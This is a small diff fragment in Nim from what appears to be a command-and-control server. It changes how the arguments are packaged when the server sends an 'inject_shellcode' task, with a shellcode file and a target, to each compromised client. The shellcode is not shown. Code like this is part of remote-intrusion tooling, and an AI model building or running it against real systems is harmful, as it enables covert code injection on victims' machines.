@@ -15,7 +15,7 @@ proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: T
   try:
     let shellcode = readFile(args[1])
     for client in server.cli.handlingClient:
-      let task = await client.sendClientTask("inject_shellcode", %*[ args[0], shellcode ])
+      let task = await client.sendClientTask("inject_shellcode", @[ args[0], shellcode ])
       if not task.isNil(): 
         await task.awaitResponse()
         if not task.isError():
